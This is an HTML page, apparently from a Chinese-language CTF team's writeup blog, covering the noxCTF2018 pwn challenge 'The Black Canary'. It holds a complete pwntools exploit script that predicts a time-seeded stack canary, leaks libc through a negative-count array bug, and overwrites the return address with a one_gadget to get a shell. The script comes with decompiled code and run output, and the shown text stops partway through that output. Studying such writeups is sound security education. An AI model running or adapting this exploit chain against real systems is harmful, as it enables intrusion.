@@ -1,0 +1,831 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="DF Team CTF writeups">
+      
+      
+        <link rel="canonical" href="https://A30lu5.github.io/blogs/noxCTF2018/pwn/TheBlackCanary/writeup/">
+      
+      
+        <meta name="author" content="DF Team">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../..">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.4">
+    
+    
+      
+        <title>The Black Canary - DF Team</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#7cb342">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
+    
+      <link rel="stylesheet" href="../../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="light-green" data-md-color-accent="light-green">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="../../../../#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://A30lu5.github.io/blogs/" title="DF Team" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                DF Team
+              </span>
+              <span class="md-header-nav__topic">
+                The Black Canary
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/A30lu5/blogs/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      A30lu5/blogs
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../.." title="Introduction" class="md-tabs__link md-tabs__link--active">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://A30lu5.github.io/blogs/" title="DF Team" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    DF Team
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/A30lu5/blogs/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      A30lu5/blogs
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="Getting Started" class="md-nav__link">
+      Getting Started
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" checked>
+    
+    <label class="md-nav__link" for="nav-1-2">
+      noxCTF2018
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        noxCTF2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2-1" type="checkbox" id="nav-1-2-1" checked>
+    
+    <label class="md-nav__link" for="nav-1-2-1">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-1">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../believeMe/writeup/" title="believe Me" class="md-nav__link">
+      believe Me
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../TheNameCalculator/writeup/" title="The Name Calculator" class="md-nav__link">
+      The Name Calculator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../GroceryList/writeup/" title="Grocery List" class="md-nav__link">
+      Grocery List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        The Black Canary
+      </label>
+    
+    <a href="./" title="The Black Canary" class="md-nav__link md-nav__link--active">
+      The Black Canary
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="漏洞分析" class="md-nav__link">
+    漏洞分析
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="利用代码" class="md-nav__link">
+    利用代码
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="漏洞分析" class="md-nav__link">
+    漏洞分析
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="利用代码" class="md-nav__link">
+    利用代码
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/A30lu5/blogs/blob/master/docs/noxCTF2018/pwn/TheBlackCanary/writeup.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>The Black Canary</h1>
+                
+                <h3 id="_1">漏洞分析<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>可输入负数，达到数组越界的目的，从而可以向后溢出覆盖返回地址。但因溢出限制，必须先覆盖canary，而canary无法泄露。</p>
+<h3 id="_2">利用代码<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">elfPath</span> <span class="o">=</span> <span class="s2">&quot;./TheBlackCanary&quot;</span>
+<span class="n">libcPath</span> <span class="o">=</span> <span class="s2">&quot;./libc.so.6&quot;</span>
+<span class="n">remoteAddr</span> <span class="o">=</span> <span class="s2">&quot;chal.noxale.com&quot;</span>
+<span class="n">remotePort</span> <span class="o">=</span> <span class="mi">6667</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfPath</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span>
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elfPath</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elfPath</span><span class="p">,</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;LD_PRELOAD&quot;</span><span class="p">:</span> <span class="n">libcPath</span><span class="p">})</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remoteAddr</span><span class="p">,</span> <span class="n">remotePort</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">libcPath</span><span class="p">:</span>
+        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libcPath</span><span class="p">)</span>
+
+<span class="c1">#  context.log_level = &quot;debug&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;deepin-terminal&quot;</span><span class="p">,</span> <span class="s2">&quot;-x&quot;</span><span class="p">,</span> <span class="s2">&quot;sh&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">]</span>
+<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;{} -&gt; {:#x}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">():</span>
+    <span class="n">info</span><span class="p">(</span><span class="s2">&quot;PID -&gt; {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">))</span>
+    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&quot;DEBUG: &quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;die</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">argument</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">argument</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;die</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">argument</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">argument</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">argument</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;die</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">argument</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">remove_single</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;die</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;arguments</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;remove?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">remove_consecutive</span><span class="p">(</span><span class="n">idx_start</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;die</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;arguments</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;start?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx_start</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;remove?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;die</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">)</span>
+
+<span class="n">get_canary</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;./set_canary&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    This challenge named &quot;The Black Canary&quot; suggests there must be something interesting with canary.</span>
+<span class="sd">    And when I take a look at .init_array, an interesting function appears(I call it set_canary, located at 0x4008C7).</span>
+<span class="sd">    unsigned __int64 set_canary()</span>
+<span class="sd">{</span>
+<span class="sd">  int v0; // ebx</span>
+<span class="sd">  unsigned __int64 v1; // rbx</span>
+<span class="sd">  int v2; // er12</span>
+<span class="sd">  unsigned __int64 v3; // ST08_8</span>
+<span class="sd">  time_t v4; // rbx</span>
+<span class="sd">  unsigned __int64 v5; // ST08_8</span>
+<span class="sd">  time_t v6; // ST08_8</span>
+<span class="sd">  time_t v7; // ST08_8</span>
+<span class="sd">  unsigned __int64 result; // rax</span>
+
+<span class="sd">  time(0LL);</span>
+<span class="sd">  time(0LL);</span>
+<span class="sd">  v0 = time(0LL) &gt;&gt; 24;</span>
+<span class="sd">  v1 = (unsigned __int64)(unsigned __int8)(v0 ^ (unsigned __int64)getenv(name)) &lt;&lt; 24;</span>
+<span class="sd">  v2 = time(0LL) &gt;&gt; 16;</span>
+<span class="sd">  v3 = v1 + ((unsigned __int64)(unsigned __int8)(v2 ^ (unsigned __int64)getenv(name)) &lt;&lt; 16);</span>
+<span class="sd">  v4 = time(0LL) &gt;&gt; 8;</span>
+<span class="sd">  v5 = (unsigned __int16)((((unsigned __int16)v4 ^ (unsigned __int16)time(0LL)) &lt;&lt; 8) &amp; 0xFF00) + v3;</span>
+<span class="sd">  v6 = ((time(0LL) &lt;&lt; 32) &amp; 0xFF00000000LL) + v5;</span>
+<span class="sd">  v7 = time(0LL) + v6;</span>
+<span class="sd">  LODWORD(v4) = time(0LL) &gt;&gt; 24;</span>
+<span class="sd">  LODWORD(v4) = (time(0LL) &gt;&gt; 16) + v4;</span>
+<span class="sd">  LODWORD(v4) = (time(0LL) &gt;&gt; 8) + v4;</span>
+<span class="sd">  result = ((unsigned __int64)(unsigned __int8)(v4 + time(0LL)) &lt;&lt; 40) + v7;</span>
+<span class="sd">  __writefsqword(0x28u, result);</span>
+<span class="sd">  return result;</span>
+<span class="sd">}</span>
+<span class="sd">    And we know that time(0) is predictable, as a result, we&#39;re able to predict canary. So if there is a stack_overflow_bug, this challenge will be easy to be pwned.</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">get_canary</span><span class="p">()</span>
+    <span class="n">success</span><span class="p">(</span><span class="s2">&quot;canary&quot;</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
+
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    The bof bug will appear it we use remove_consecutive() with a negative amount of arguments.</span>
+<span class="sd">    void __fastcall remove_consecutive(char *arg_list, _DWORD *cnt)</span>
+<span class="sd">{</span>
+<span class="sd">  size_t len; // rax</span>
+<span class="sd">  char idx; // [rsp+15h] [rbp-Bh]</span>
+<span class="sd">  char remove_num; // [rsp+16h] [rbp-Ah]</span>
+<span class="sd">  char i; // [rsp+17h] [rbp-9h]</span>
+<span class="sd">  unsigned __int64 v6; // [rsp+18h] [rbp-8h]</span>
+
+<span class="sd">  v6 = __readfsqword(0x28u);</span>
+<span class="sd">  idx = 0;</span>
+<span class="sd">  remove_num = 0;</span>
+<span class="sd">  i = 0;</span>
+<span class="sd">  print(&quot;With which argument would you like to start?&quot;);</span>
+<span class="sd">  fflush(stdin);</span>
+<span class="sd">  __isoc99_scanf(&quot;%hhd&quot;, &amp;idx);</span>
+<span class="sd">  getchar();</span>
+<span class="sd">  if ( idx &lt; 0 || (char)*cnt &lt;= idx )</span>
+<span class="sd">  {</span>
+<span class="sd">    print(&quot;Index not in range&quot;);</span>
+<span class="sd">  }</span>
+<span class="sd">  else</span>
+<span class="sd">  {</span>
+<span class="sd">    print(&quot;How many arguments would you like to remove?&quot;);</span>
+<span class="sd">    fflush(stdin);</span>
+<span class="sd">    __isoc99_scanf(&quot;%hhd&quot;, &amp;remove_num);        // negative</span>
+<span class="sd">    getchar();</span>
+<span class="sd">    if ( remove_num + idx &lt; (char)*cnt )</span>
+<span class="sd">    {</span>
+<span class="sd">      for ( i = 0; i &lt; remove_num; ++i )</span>
+<span class="sd">      {</span>
+<span class="sd">        if ( remove_num + i + idx &gt;= (char)*cnt )</span>
+<span class="sd">        {</span>
+<span class="sd">          arg_list[32 * (idx + i)] = 0;</span>
+<span class="sd">        }</span>
+<span class="sd">        else</span>
+<span class="sd">        {</span>
+<span class="sd">          len = strlen(&amp;arg_list[32 * (i + idx + remove_num)]);</span>
+<span class="sd">          strncpy(&amp;arg_list[32 * (idx + i)], &amp;arg_list[32 * (i + idx + remove_num)], len + 1);</span>
+<span class="sd">          arg_list[32 * (i + idx + remove_num)] = 0;</span>
+<span class="sd">        }</span>
+<span class="sd">      }</span>
+<span class="sd">      *cnt -= remove_num;                       // bug here</span>
+<span class="sd">    }</span>
+<span class="sd">  }</span>
+<span class="sd">}</span>
+<span class="sd">    A negative number will lead to cnt be greater than 10, which to say, we can print the content behand arg_list[328] on the stack then we can leak libc. </span>
+<span class="sd">    Most importantly, we can use edit(10, payload) to modify retaddr to one_gadget.</span>
+<span class="sd">    Then we&#39;re able to get a shell.</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">add</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">31</span><span class="p">)</span>
+    <span class="n">remove_consecutive</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="s1">&#39;-6&#39;</span><span class="p">)</span>
+    <span class="n">show</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\0\0</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x5f1168</span>
+    <span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc&quot;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+
+    <span class="c1">#  DEBUG()</span>
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x45216</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="s1">&#39;aaaaaaaa&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;bbbbbbbb&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">leave</span><span class="p">()</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    noxCTF2018_The_Black_Canary [master●●] python exp.py r</span>
+<span class="sd">    [*] &#39;/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/TheBlackCanary&#39;</span>
+<span class="sd">        Arch:     amd64-64-little</span>
+<span class="sd">        RELRO:    Partial RELRO</span>
+<span class="sd">        Stack:    Canary found</span>
+<span class="sd">        NX:       NX enabled</span>
+<span class="sd">        PIE:      No PIE (0x400000)</span>
+<span class="sd">    [+] Opening connection to chal.noxale.com on port 6667: Done</span>
+<span class="sd">    [*] &#39;/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/libc.so.6&#39;</span>
+<span class="sd">        Arch:     amd64-64-little</span>
+<span class="sd">        RELRO:    Partial RELRO</span>
+<span class="sd">        Stack:    Canary found</span>
+<span class="sd">        NX:       NX enabled</span>
+<span class="sd">        PIE:      PIE enabled</span>
+<span class="sd">    [+] canary -&gt; 0xaa1fb7311f1f</span>
